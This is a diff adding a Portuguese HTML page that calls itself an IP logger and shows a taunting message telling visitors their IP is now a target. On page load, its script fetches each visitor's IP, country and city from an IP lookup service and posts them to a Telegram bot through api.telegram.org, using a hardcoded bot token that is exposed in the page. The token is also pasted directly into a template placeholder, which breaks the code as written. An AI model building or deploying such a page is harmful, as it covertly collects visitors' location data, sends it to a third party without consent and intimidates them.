@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>IP Logger de ip da CICIA</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      font-family: 'Courier New', monospace;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+
+    .cruz {
+      position: absolute;
+      width: 2px;
+      height: 30px;
+      background: white;
+      box-shadow: 0 0 10px white;
+    }
+
+    .cruz::after {
+      content: '';
+      position: absolute;
+      top: 14px;
+      left: -14px;
+      width: 30px;
+      height: 2px;
+      background: white;
+      box-shadow: 0 0 10px white;
+    }
+
+    .mensagem {
+      position: absolute;
+      bottom: 20px;
+      width: 100%;
+      text-align: center;
+      font-size: 20px;
+      color: red;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="mensagem">Seu ip acabou de virar alvo tests da ciciaKKJ</div>
+
+  <script>
+    
+    const BOT_TOKEN = '8118082535:AAHALDpnPsmGwgH9cWXi3dtzhXqQQMe-feE';
+    const CHAT_ID = '@CICIAIPS_BOT';
+
+    
+    fetch('https://ip-api.com/json')
+      .then(res => res.json())
+      .then(data => {
+        const mensagem = `🔍 Novo visitante\nIP: ${data.query}\nPaís: ${data.country} (${data.countryCode})\nCidade: ${data.city}`;
+        fetch(`https://api.telegram.org/bot${8118082535:AAHALDpnPsmGwgH9cWXi3dtzhXqQQMe-feE}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: mensagem
+          })
+        });
+      })
+      .catch(console.error);
+
+    for (let i = 0; i < 100; i++) {
+      const cruz = document.createElement('div');
+      cruz.className = 'cruz';
+      cruz.style.top = Math.random() * window.innerHeight + 'px';
+      cruz.style.left = Math.random() * window.innerWidth + 'px';
+      document.body.appendChild(cruz);
+    }
+  </script>
+
+</body>
+</html>
